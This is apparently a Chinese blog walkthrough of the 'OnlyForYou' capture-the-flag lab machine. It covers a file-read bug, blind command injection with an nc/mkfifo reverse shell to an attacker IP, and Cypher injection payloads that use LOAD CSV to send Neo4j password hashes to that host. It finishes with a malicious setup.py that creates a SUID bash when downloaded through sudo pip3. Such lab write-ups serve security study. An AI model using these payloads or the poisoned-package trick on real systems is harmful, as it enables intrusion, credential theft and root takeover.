# OnlyForYou

OnlyForYou 是一台中等难度的 Linux 计算机，其特点是 Web 应用程序容易受到本地文件包含 （LFI） 的影响，该应用程序用于访问源代码，从而揭示盲目命令注入漏洞，从而导致目标系统上的 shell。该计算机运行多个本地服务，其中一个使用默认凭据，并公开易受“Cypher”注入攻击的端点。利用此漏洞会泄漏“Neo4j”数据库中的哈希值，从而授予对计算机的“SSH”访问权限。最后，配置错误的“sudoers”文件允许以“root”权限运行“pip3 download”命令。权限提升是通过在本地“Gogs”服务上创建和托管恶意“Python”包并下载来实现的。

---

## 外部信息收集

### 端口扫描

循例nmap

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/5887788c-f53f-496c-9d21-a9031eb08ac7.png)

### Web枚举

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/18b7efb8-7d3b-06e3-e456-71889794cbfa.png)

#### ffuf扫vhost

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/bf4680f1-016c-f41b-87f0-8f3ec6c2c3f7.png)

有一个beta

#### beta子域

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/8bd52b77-3aed-4feb-8b56-86dfc97d0c00.png)

在这里的Source code可以下载zip

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/7c74cc53-2c4f-7e0b-bf5a-69bd4b9c7e63.png)

zip是beta的站点源码

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/50317e5e-c84f-8654-f603-b7b3dbaf6c76.png)

##### 任意文件读取

```python3
@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)
```

在app.py中，/download的实现很明显存在任意文件读取，原因是虽然对filename做了过滤".."以防止目录遍历，但由于os.path.join的特性，这个函数如果遇到绝对路径，则会直接返回这个绝对路径，从而忽略掉app.config['LIST_FOLDER']，所以我们可以不需要../也可以实现目录遍历

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/309fe08d-6838-74f0-7650-6555c1387e3f.png)

读nginx配置文件

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/1554d658-5132-9e7a-9e67-7c1551e4d82b.png)

## Foldhold - RCE

知道路径后，读主站的app.py

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/6a2a610a-e74e-2028-ff6c-6ad46475b8f7.png)

发现那个表单其实是会被处理的，通过import我们可以得知参数被传入了另一个模块里的函数处理

	from form import sendmessage

读form.py

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/edc09965-d3f6-f4f9-2542-a072ff59fe65.png)

很明显，常规command injection，但是是盲的。

尝试通过nc连接攻击机，可行

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/7cebb2f6-9507-ed8e-064c-521df519c0da.png)

常规reverse shell payload

	mkfifo+/tmp/f1%3bnc+10.10.14.18+8888+<+/tmp/f1+|+/bin/bash+>+/tmp/f1

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/6b972257-c25f-377e-a0c5-fa003e1ad2e8.png)

## 内部信息收集

ss -tlnp发现好几个端口

传个chisel过去，攻击机开启server

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/710c1ab9-b9d8-cf72-2939-17075f087eaf.png)

目标机器连接过来，反向socks

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/86678ee5-0a2f-12b9-fd54-6d19c28249cd.png)

火狐插件

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/c7168773-c532-44f7-ce21-36d355d9b416.png)

### 3000端口 - Gogs

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/e77e2427-a36a-2c71-43b5-87195e8446f2.png)

### 8001端口

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/130fe42e-1a83-b91a-1484-a4b33ea15541.png)

看见是一个简陋的登录框，弱口令就登进去了

	admin:admin

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/8acd91fd-4673-e370-0f20-5c5da083826b.png)

在dashboard中可以看到它使用neo4j

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/1a0d58d4-6084-7893-6e4a-a6e88fe35a8b.png)

## 本地横向移动 -> john

在Employee可以搜索，但是这里存在[注入](https://hackmd.io/@Chivato/rkAN7Q9NY)

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/fa6aff0d-49e8-17df-7117-1f22826a4f0f.png)

查表

	a' CALL db.labels() YIELD label AS d LOAD CSV FROM 'http://10.10.14.18:8000/'+d AS y RETURN y//

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/2862dadb-d219-457e-a307-6a3c3ca35a00.png)

获取key的属性

	a' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.18:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //

```shell
10.10.11.210 - - [26/Dec/2023 18:21:02] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [26/Dec/2023 18:21:03] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [26/Dec/2023 18:21:04] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [26/Dec/2023 18:21:04] "GET /?username=john HTTP/1.1" 200 -
```

爆john的密码，CrackStation出了明文密码

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/4430597c-cba3-46dc-de4b-2cff58dde986.png)

使用这组凭据我们能够通过ssh登录john

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/fb0245d8-86de-767d-bb55-57b2a18d37d3.png)

拿到user flag

## 本地权限提升

sudo -l

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/757509fe-4bbc-1be5-83ed-4d7eecb26255.png)

这里会从gogs中下载pip包，pip download也会执行setup.py

回到3000端口，使用john的凭据登录，我们可以看到这里有个存储库

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/bfd9df49-ebf2-b7f7-a181-15c732ca236f.png)

打法很简单，我们制作恶意pip包，然后上传到gogs存储库中，从而允许我们sudo pip下载恶意pip包从而提权

创建个文件夹，setup.py:

```python3
import os

os.system('cp /bin/bash /tmp/bash;chmod +s /tmp/bash')


from setuptools import setup, find_packages
import sys

setup(
    name="packer",
    version="0.1.0",
    author="",
    author_email="",
    description="Python Framework.",
    license="MIT",
    url="",
    packages=find_packages(),
    include_package_data=True,
    classifiers=[
        "Environment :: Web Environment",
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Natural Language :: Chinese',
        'Operating System :: MacOS',
        'Operating System :: Microsoft',
        'Operating System :: POSIX',
        'Operating System :: Unix',
        'Topic :: NLP',
        'Topic :: Software Development :: Libraries :: Python Modules',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
    ],
    zip_safe=True,
)
```

然后运行setup.py创建tar.gz包

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/bbe753b0-d06a-4a20-06a7-9a7a2120d23f.png)

然后在存储库中上传文件

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/4b599418-ebae-f2ac-eba4-5f6c83ff9e12.png)

上传文件且提交后，得到的url是

	http://127.0.0.1:3000/john/Test/raw/master/packer-0.1.0.tar.gz

此外还需要做一件事就是将该存储库设为公开，否则因为它是私有的导致无权访问

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/0c95ed83-47ee-0df8-67af-f18e67772773.png)

这一切搞定之后，直接sudo

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/c014f453-a20c-9759-b683-83f210c1a31c.png)

root flag还在老地方

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/0b860e9b-f759-ddc0-b39d-ebd032b81178.png)

